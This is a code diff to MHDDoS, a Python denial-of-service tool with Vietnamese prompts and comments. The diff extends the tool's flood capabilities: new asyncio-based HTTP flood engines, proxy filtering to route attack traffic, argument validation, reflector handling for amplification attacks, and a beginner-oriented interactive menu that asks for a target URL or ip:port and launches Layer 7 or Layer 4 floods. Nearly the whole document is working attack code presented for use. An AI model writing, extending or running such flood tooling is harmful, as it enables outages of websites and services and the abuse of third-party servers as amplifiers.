                                  "ONLINE" if r.is_alive else "OFFLINE"))
+                continue
 
     @staticmethod
     def stop():
@@ -1772,19 +2115,19 @@ class ToolsConsole:
                   '\n'
                   'Example:\n'
                   '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
+                  '   L7 async: python3 %s ASYNCIO <url> 0 <workers> none.txt <rpc> <duration>\n'
                   '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                   '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                   '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                   ' Amplification)>\n') %
               (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
-               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
-               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
-               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
+               ", ".join(sorted(Methods.LAYER4_METHODS)), len(Methods.LAYER4_METHODS),
+               ", ".join(sorted(Methods.LAYER7_METHODS)), len(Methods.LAYER7_METHODS),
+               ", ".join(sorted(ToolsConsole.METHODS)), len(ToolsConsole.METHODS),
                ", ".join(["TOOLS", "HELP", "STOP"]), 3,
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
-               argv[0], argv[0], argv[0], argv[0]))
+               argv[0], argv[0], argv[0], argv[0], argv[0]))
 
-    # noinspection PyBroadException
     @staticmethod
     def ts_srv(domain):
         records = ['_ts3._udp.', '_tsdns._tcp.']
@@ -1796,20 +2139,45 @@ class ToolsConsole:
             try:
                 srv_records = resolver.resolve(rec + domain, 'SRV')
                 for srv in srv_records:
-                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
-                        srv.port)
-            except:
+                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(srv.port)
+            except Exception:
                 Info[rec] = 'Not found'
-
         return Info
 
-    # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
-        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
-            return s.json()
+        for url in (f"https://ipwho.is/{domain}",
+                    f"https://ipwhois.app/json/{domain}/"):
+            with suppress(Exception):
+                with get(url, timeout=20) as r:
+                    if r.status_code != 200:
+                        continue
+                    j = r.json()
+                    if not j.get("success", True):
+                        continue
+                    conn = j.get("connection") or {}
+                    return {
+                        "success": True,
+                        "country": j.get("country") or "-",
+                        "city": j.get("city") or "-",
+                        "region": j.get("region") or "-",
+                        "org": j.get("org") or conn.get("org") or "-",
+                        "isp": j.get("isp") or conn.get("isp") or "-",
+                    }
         return {"success": False}
 
+def _proxy_type_from_int(proxy_ty: int) -> ProxyType:
+    """1 = HTTP, 4 = SOCKS4, 5 = SOCKS5."""
+    return {1: ProxyType.HTTP, 4: ProxyType.SOCKS4, 5: ProxyType.SOCKS5}.get(
+        proxy_ty, ProxyType.HTTP)
+
+
+def _read_proxies(path: Path, ptype: ProxyType) -> Set[Proxy]:
+    """PyRoxy mới nhận ptype; bản cũ thì không -> fallback."""
+    try:
+        return ProxyUtiles.readFromFile(path, ptype)
+    except TypeError:
+        return ProxyUtiles.readFromFile(path)
 
 def handleProxyList(con, proxy_li, proxy_ty, url=None, check_threads: int = 100):
     if proxy_ty not in {4, 5, 1, 0, 6}:
@@ -1826,8 +2194,10 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None, check_threads: int = 100)
                 f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
             Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=5, threads=min(check_threads, 500),
-                url=url.human_repr() if url else "http://httpbin.org/get",
+                Proxies, timeout=5, threads=max(1, min(check_threads, 500)),
+                url=url.human_repr() if url
+                else con.get("PROXY_CHECK_URL",
+                                "https://www.google.com/generate_204"),
             )
 
             if not Proxies:
@@ -1840,7 +2210,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None, check_threads: int = 100)
                 stringBuilder += (proxy.__str__() + "\n")
             wr.write(stringBuilder)
 
-    proxies = ProxyUtiles.readFromFile(proxy_li)
+    proxies = _read_proxies(proxy_li, _proxy_type_from_int(proxy_ty))
     if proxies:
         logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
     else:
@@ -1850,12 +2220,10 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None, check_threads: int = 100)
 
     return proxies
 
-# =====================================================================
-#  INTERACTIVE MENU
-#  Chạy `python start.py` (không argument) -> mở menu
-# =====================================================================
 
-import sys as _sys
+# =====================================================================
+#  INTERACTIVE MENU  +  HÀM PHỤ TRỢ
+# =====================================================================
 
 DEFAULT_REFLECTORS = {
     "NTP":   ["216.239.35.0", "216.239.35.4", "129.6.15.28", "132.163.97.1"],
@@ -1876,25 +2244,24 @@ BANNER = r"""
 
 
 def _reset_logging():
-    """exit() gọi logging.shutdown() làm hỏng handler -> cần dựng lại trước mỗi lần chạy."""
     root = getLogger()
     for h in list(root.handlers):
         root.removeHandler(h)
         with suppress(Exception):
             h.close()
-    stream = _sys.stderr
+    stream = sys.stderr
     if getattr(stream, "closed", False):
         try:
-            stream = _sys.stderr = open(2, "w", buffering=1, encoding="utf-8", errors="replace")
+            stream = sys.stderr = open(2, "w", buffering=1,
+                                       encoding="utf-8", errors="replace")
         except OSError:
-            stream = _sys.stdout
+            stream = sys.stdout
     basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
                 datefmt="%H:%M:%S", stream=stream, force=True)
     logger.setLevel("INFO")
 
 
-def _ask(prompt, default=None, cast=str, choices=None, upper=False):
-    """Hỏi người dùng, có validate + giá trị mặc định."""
+def _ask(prompt, default=None, cast=str, choices=None, upper=False, minimum=None):
     while True:
         suffix = f" {bcolors.OKGREEN}[{default}]{bcolors.RESET}" if default is not None else ""
         try:
@@ -1915,9 +2282,14 @@ def _ask(prompt, default=None, cast=str, choices=None, upper=False):
                 print(f"  {bcolors.FAIL}-> Chỉ chấp nhận: {', '.join(sorted(norm))}{bcolors.RESET}")
                 continue
         try:
-            return cast(raw)
+            val = cast(raw)
         except (ValueError, TypeError):
             print(f"  {bcolors.FAIL}-> Giá trị không hợp lệ, thử lại!{bcolors.RESET}")
+            continue
+        if minimum is not None and isinstance(val, int) and val < minimum:
+            print(f"  {bcolors.FAIL}-> Phải >= {minimum}{bcolors.RESET}")
+            continue
+        return val
 
 
 def _ensure_empty_proxy_file():
@@ -1926,6 +2298,17 @@ def _ensure_empty_proxy_file():
     if not p.exists():
         p.write_text("")
     return "none.txt"
+
+
+def _ensure_basic_files():
+    base = __dir__ / "files"
+    base.mkdir(parents=True, exist_ok=True)
+    for name, data in (("useragent.txt", DEFAULT_USERAGENTS),
+                       ("referers.txt", DEFAULT_REFERERS)):
+        p = base / name
+        if not p.exists() or not p.read_text(encoding="utf-8", errors="replace").strip():
+            p.write_text("\n".join(data) + "\n", encoding="utf-8")
+            print(f"  {bcolors.OKCYAN}-> Đã tạo files/{name}{bcolors.RESET}")
 
 
 def _ensure_reflector_file(name, method):
@@ -1948,15 +2331,21 @@ def _print_methods():
 
 
 def _menu_layer7():
+    _ensure_basic_files()
     print(f"\n{bcolors.HEADER}=== Layer 7 - HTTP Flood ==={bcolors.RESET}")
     print("  " + ", ".join(sorted(Methods.LAYER7_METHODS)))
     print(f"  {bcolors.WARNING}(GET / POST là dễ nhất, phù hợp người mới){bcolors.RESET}\n")
 
     method = _ask("Method", default="GET", choices=Methods.LAYER7_METHODS, upper=True)
-    if method == "BOMB":
-        bp = Path.home() / "go" / "bin" / "bombardier"
-        if not (bp.exists() or bp.with_suffix(".exe").exists()):
-            print(f"  {bcolors.WARNING}Lưu ý: BOMB cần binary 'bombardier' trong ~/go/bin{bcolors.RESET}")
+    if method == "BOMB" and not (
+            bombardier_path.exists() or bombardier_path.with_suffix(".exe").exists()):
+        print(f"  {bcolors.WARNING}Lưu ý: BOMB cần binary 'bombardier' trong "
+              f"{bombardier_path.parent}{bcolors.RESET}")
+    if method in Methods.ASYNC_METHODS:
+        print(f"  {bcolors.OKCYAN}AIOHTTP/ASYNCIO chạy bằng asyncio: "
+              f"'Số threads' = số worker coroutine (nên để 500-5000).{bcolors.RESET}")
+        print(f"  {bcolors.OKCYAN}ASYNCIO mở kết nối mới mỗi vòng (CPS cao); "
+              f"AIOHTTP giữ kết nối keep-alive.{bcolors.RESET}")
 
     url = _ask("URL mục tiêu (vd: https://example.com)")
     if not url.lower().startswith("http"):
@@ -1967,12 +2356,15 @@ def _menu_layer7():
                           default="0", choices=["0", "1", "4", "5", "6"])
         proxylist = _ask("Tên file proxy (trong files/proxies/)", default="proxies.txt")
         print(f"  {bcolors.WARNING}Nếu file chưa có, tool sẽ tự tải & check proxy (hơi lâu).{bcolors.RESET}")
+        if method in Methods.ASYNC_METHODS:
+            print(f"  {bcolors.WARNING}Lưu ý: AIOHTTP/ASYNCIO chỉ dùng được proxy HTTP "
+                  f"(socks type 1).{bcolors.RESET}")
     else:
         socks_type, proxylist = "0", _ensure_empty_proxy_file()
 
-    threads = _ask("Số threads", default="500", cast=int)
-    rpc = _ask("RPC (request mỗi kết nối)", default="1", cast=int)
-    duration = _ask("Thời gian chạy (giây)", default="60", cast=int)
+    threads = _ask("Số threads", default="500", cast=int, minimum=1)
+    rpc = _ask("RPC (request mỗi kết nối)", default="1", cast=int, minimum=1)
+    duration = _ask("Thời gian chạy (giây)", default="60", cast=int, minimum=1)
     debug = _ask("Bật debug?", default="n", choices=["y", "n"]).lower() == "y"
 
     args = [method, url, socks_type, str(threads), proxylist, str(rpc), str(duration)]
@@ -1987,15 +2379,15 @@ def _menu_layer4():
     print(f"  {bcolors.WARNING}Nhóm amplification: {', '.join(sorted(Methods.LAYER4_AMP))}{bcolors.RESET}\n")
 
     method = _ask("Method", default="TCP", choices=Methods.LAYER4_METHODS, upper=True)
-    if method in {"SYN", "ICMP"}:
-        print(f"  {bcolors.WARNING}Lưu ý: {method} cần quyền Admin (raw socket).{bcolors.RESET}")
+    if method in {"SYN", "ICMP", "OVH-UDP"}:
+        print(f"  {bcolors.WARNING}Lưu ý: {method} cần quyền Admin/root (raw socket).{bcolors.RESET}")
 
     target = _ask("Target ip:port", default="1.1.1.1:80")
     if ":" not in target:
         target += ":80"
 
-    threads = _ask("Số threads", default="600", cast=int)
-    duration = _ask("Thời gian chạy (giây)", default="60", cast=int)
+    threads = _ask("Số threads", default="600", cast=int, minimum=1)
+    duration = _ask("Thời gian chạy (giây)", default="60", cast=int, minimum=1)
     args = [method, target, str(threads), str(duration)]
 
     if method in Methods.LAYER4_AMP:
@@ -2013,7 +2405,6 @@ def _menu_layer4():
 
 
 def _run_args(args):
-    """Giả lập argv rồi gọi lại main() y như chạy từ command-line."""
     global argv
     _reset_logging()
     saved = argv
@@ -2025,15 +2416,16 @@ def _run_args(args):
 
 
 def interactive_menu():
+    _ensure_basic_files()
     while True:
         print(bcolors.OKCYAN + BANNER.format(ver=__version__) + bcolors.RESET)
         print(f"  {bcolors.BOLD}MHDDoS - Menu tương tác{bcolors.RESET}\n")
         print("  [1] Layer 7  - HTTP Flood")
         print("  [2] Layer 4  - TCP / UDP Flood")
-        print("  [3] Công cụ  - PING / INFO / DSTAT / TSSRV / CHECK")
+        print("  [3] Công cụ  - PING / INFO / DSTAT / TSSRV / CHECK / CFIP / DNS")
         print("  [4] Xem danh sách method")
         print("  [5] Hướng dẫn dùng command-line")
-        print("  [6] Dừng tất cả tiến trình python")
+        print("  [6] Dừng tất cả tiến trình python (cẩn thận: kill cả script khác)")
         print("  [0] Thoát\n")
 
         choice = _ask("Chọn", default="0")
@@ -2073,6 +2465,25 @@ def interactive_menu():
             pass
         print(f"\n{bcolors.OKGREEN}--- Xong, quay lại menu ---{bcolors.RESET}\n")
 
+
+# =====================================================================
+#  MAIN
+# =====================================================================
+
+def _int_arg(index: int, name: str, minimum: int = 1, maximum: int = None) -> int:
+    if index >= len(argv):
+        exit(f"Thiếu tham số: {name} (argv[{index}])")
+    try:
+        val = int(str(argv[index]).strip())
+    except ValueError:
+        exit(f"{name} không hợp lệ: '{argv[index]}' (phải là số nguyên)")
+    if val < minimum:
+        exit(f"{name} phải >= {minimum} (đang là {val})")
+    if maximum is not None and val > maximum:
+        exit(f"{name} phải <= {maximum} (đang là {val})")
+    return val
+
+
 def main():
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
@@ -2082,26 +2493,34 @@ def main():
                 raise IndexError()
             if one == "TOOLS":
                 ToolsConsole.runConsole()
+                return
             if one == "STOP":
                 ToolsConsole.stop()
+                return
 
             method = one
+            if method not in Methods.ALL_METHODS:
+                exit("Method Not Found: %s\nCác method hợp lệ: %s"
+                     % (method, ", ".join(sorted(Methods.ALL_METHODS))))
+
             host = None
             port = None
             url = None
             event = Event()
             event.clear()
             target = None
-            urlraw = argv[2].strip()
+
+            urlraw = argv[2].strip() if len(argv) >= 3 else ""
+            if not urlraw:
+                exit("Thiếu mục tiêu (argv[2])")
             if not urlraw.startswith("http"):
                 urlraw = "http://" + urlraw
 
-            if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" %
-                     ", ".join(Methods.ALL_METHODS))
-
             if method in Methods.LAYER7_METHODS:
-                url = URL(urlraw)
+                try:
+                    url = URL(urlraw)
+                except Exception as e:
+                    exit("URL không hợp lệ: ", urlraw, str(e))
                 host = url.host
 
                 if method != "TOR":
@@ -2110,57 +2529,87 @@ def main():
                     except Exception as e:
                         exit('Cannot resolve hostname ', url.host, str(e))
 
-                threads = int(argv[4])
-                rpc = int(argv[6])
-                timer = int(argv[7])
-                proxy_ty = int(argv[3].strip())
-                proxy_li = Path(__dir__ / "files/proxies/" /
-                                argv[5].strip())
+                threads = _int_arg(4, "threads", 1)
+                rpc = _int_arg(6, "rpc", 1)
+                timer = _int_arg(7, "duration", 1)
+                proxy_ty = _int_arg(3, "socks_type", 0, 6)
+                proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
                 useragent_li = Path(__dir__ / "files/useragent.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
-                bombardier_path = Path.home() / "go/bin/bombardier"
                 proxies: Any = set()
 
                 if method == "BOMB" and not (
-                    bombardier_path.exists()
-                    or bombardier_path.with_suffix('.exe').exists()):
+                        bombardier_path.exists()
+                        or bombardier_path.with_suffix('.exe').exists()):
                     exit("Install bombardier: "
-                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method")
+                         "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method")
 
                 if len(argv) == 9:
                     logger.setLevel("DEBUG")
 
                 if not useragent_li.exists():
-                    exit("The Useragent file doesn't exist ")
+                    exit("The Useragent file doesn't exist "
+                         f"({useragent_li}) - chạy menu hoặc tạo file.")
                 if not referers_li.exists():
-                    exit("The Referer file doesn't exist ")
+                    exit("The Referer file doesn't exist "
+                         f"({referers_li}) - chạy menu hoặc tạo file.")
 
                 uagents = set(a.strip()
-                              for a in useragent_li.open("r+").readlines())
+                              for a in useragent_li.open("r+").readlines() if a.strip())
                 referers = set(a.strip()
-                               for a in referers_li.open("r+").readlines())
+                               for a in referers_li.open("r+").readlines() if a.strip())
 
-                if not uagents: exit("Empty Useragent File ")
-                if not referers: exit("Empty Referer File ")
+                if not uagents:
+                    exit("Empty Useragent File ")
+                if not referers:
+                    exit("Empty Referer File ")
 
-                if threads > 1000:
+                if threads > 1000 and method not in Methods.ASYNC_METHODS:
                     logger.warning("Thread is higher than 1000")
                 if rpc > 100:
-                    logger.warning(
-                        "RPC (Request Pre Connection) is higher than 100")
+                    logger.warning("RPC (Request Pre Connection) is higher than 100")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url,
-                check_threads=threads)
-                for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                                          check_threads=threads)
+
+                if method == "BOMB" and not proxies:
+                    exit("BOMB cần proxy (thêm proxy hoặc chọn method khác)")
+
+                # [B18] async engine chỉ hỗ trợ proxy HTTP -> lọc bỏ SOCKS
+                if method in Methods.ASYNC_METHODS and proxies:
+                    http_proxies = {p for p in proxies
+                                    if p.type not in (ProxyType.SOCKS4, ProxyType.SOCKS5)}
+                    if not http_proxies:
+                        logger.warning("Không có proxy HTTP nào -> chạy không proxy")
+                        proxies = None
+                    else:
+                        if len(http_proxies) != len(proxies):
+                            logger.warning(
+                                f"Bỏ {len(proxies) - len(http_proxies)} proxy SOCKS "
+                                f"(AIOHTTP/ASYNCIO chỉ hỗ trợ proxy HTTP)")
+                        proxies = http_proxies
+
+                if method == "AIOHTTP":
+                    AsyncHttpFlood(url, workers=threads, rpc=rpc, synevent=event,
+                                   useragents=uagents, referers=referers,
+                                   proxies=proxies).start()
+                elif method == "ASYNCIO":
+                    AsyncCpsFlood(url, workers=threads, rpc=rpc, synevent=event,
+                                  proxies=proxies).start()
+                else:
+                    for thread_id in range(threads):
+                        HttpFlood(thread_id, url, host, method, rpc, event,
+                                  uagents, referers, proxies).start()
 
             if method in Methods.LAYER4_METHODS:
-                target = URL(urlraw)
+                try:
+                    target = URL(urlraw)
+                except Exception as e:
+                    exit("Target không hợp lệ: ", urlraw, str(e))
 
                 port = target.port
                 target = target.host
-                target_host = target          # giữ tên gốc để báo lỗi
+                target_host = target
 
                 if not port:
                     logger.warning("Port Not Selected, Set To Default: 80")
@@ -2172,53 +2621,61 @@ def main():
                 try:
                     target = gethostbyname(target)
                 except Exception as e:
-                    exit('Cannot resolve hostname ', target_host, e)
+                    exit('Cannot resolve hostname ', target_host, str(e))
 
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP",
+                              "ARD", "SYN", "ICMP", "OVH-UDP"} and \
                         not ToolsConsole.checkRawSocket():
-                    exit("Cannot Create Raw Socket")
+                    exit("Cannot Create Raw Socket (cần quyền root/Administrator)")
 
                 if method in Methods.LAYER4_AMP:
                     logger.warning("this method need spoofable servers please check")
                     logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")
 
-                threads = int(argv[3])
-                timer = int(argv[4])
+                threads = _int_arg(3, "threads", 1)
+                timer = _int_arg(4, "duration", 1)
                 proxies = None
                 ref = None
 
-                if len(argv) >= 6:
-                    argfive = argv[5].strip()
-                    if argfive:
-                        refl_li = Path(__dir__ / "files" / argfive)
-                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-                            if not refl_li.exists():
-                                exit("The reflector file doesn't exist")
-                            if len(argv) == 7:
-                                logger.setLevel("DEBUG")
-                            ref = set(a.strip()
-                                      for a in Tools.IP.findall(refl_li.open("r").read()))
-                            if not ref: exit("Empty Reflector File ")
+                argfive = argv[5].strip() if len(argv) >= 6 else ""
 
-                        elif argfive.isdigit():
-                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                                exit("this method cannot use for layer4 proxy")
-                            if len(argv) < 7:
-                                exit("Missing proxy file argument after socks type")
-                            if len(argv) == 8:
-                                logger.setLevel("DEBUG")
-                            proxy_ty = int(argfive)
-                            proxy_li = Path(__dir__ / "files/proxies" / Path(argv[6].strip()).name)
-                            proxies = handleProxyList(con, proxy_li, proxy_ty,
-                                                        check_threads=threads)
+                if method in Methods.LAYER4_AMP:
+                    if not argfive:
+                        exit(f"{method} cần file reflector:\n"
+                             f"  python start.py {method} <ip:port> <threads> "
+                             f"<duration> <reflector_file>")
+                    refl_li = Path(__dir__ / "files" / argfive)
+                    if not refl_li.exists():
+                        exit(f"Reflector file không tồn tại: {refl_li}")
+                    if len(argv) == 7:
+                        logger.setLevel("DEBUG")
+                    ref = set(Tools.IP.findall(refl_li.open("r").read()))
+                    if not ref:
+                        exit("Empty Reflector File ")
 
-                        else:
+                elif argfive:
+                    if argfive.isdigit():
+                        if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS",
+                                          "CONNECTION"}:
+                            exit("this method cannot use for layer4 proxy")
+                        if len(argv) < 7:
+                            exit("Missing proxy file argument after socks type")
+                        if len(argv) == 8:
                             logger.setLevel("DEBUG")
-                
+                        proxy_ty = int(argfive)
+                        proxy_li = Path(__dir__ / "files/proxies" /
+                                        Path(argv[6].strip()).name)
+                        proxies = handleProxyList(con, proxy_li, proxy_ty,
+                                                  check_threads=threads)
+                    else:
+                        exit(f"Tham số không hợp lệ: '{argfive}' "
+                             f"(phải là socks type dạng số, hoặc tên file reflector)")
+
                 protocolid = con.get("MINECRAFT_DEFAULT_PROTOCOL", 758)
 
                 if method == "MCBOT":
                     with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
+                        s.settimeout(2)
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                         Tools.send(s, Minecraft.data(b'\x00'))
 
@@ -2238,23 +2695,33 @@ def main():
                 % (target or url.host, method, timer, threads))
             event.set()
             ts = time()
+            stats = (f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,'
+                     f'{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,'
+                     f'{bcolors.WARNING} Method:{bcolors.OKBLUE} %s'
+                     f'{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,'
+                     f'{bcolors.WARNING} CPS:{bcolors.OKBLUE} %s,'
+                     f'{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}')
+            show_stats = logger.info if method in Methods.ASYNC_METHODS else logger.debug
             while time() < ts + timer:
-                logger.debug(
-                    f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
-                    (target or url.host,
-                     port or (url.port or 80),
-                     method,
-                     Tools.humanformat(int(REQUESTS_SENT)),
-                     Tools.humanbytes(int(BYTES_SEND)),
-                     round((time() - ts) / timer * 100, 2)))
+                show_stats(stats % (
+                    target or url.host,
+                    port or (url.port or 80),
+                    method,
+                    Tools.humanformat(int(REQUESTS_SENT)),
+                    Tools.humanformat(int(CONNECTIONS_SENT)),
+                    Tools.humanbytes(int(BYTES_SEND)),
+                    round((time() - ts) / timer * 100, 2)))
                 REQUESTS_SENT.set(0)
                 BYTES_SEND.set(0)
+                CONNECTIONS_SENT.set(0)          # [B18]
                 sleep(1)
 
             event.clear()
             exit()
 
         ToolsConsole.usage()
+
+
 if __name__ == '__main__':
     if len(argv) < 2:
         try:
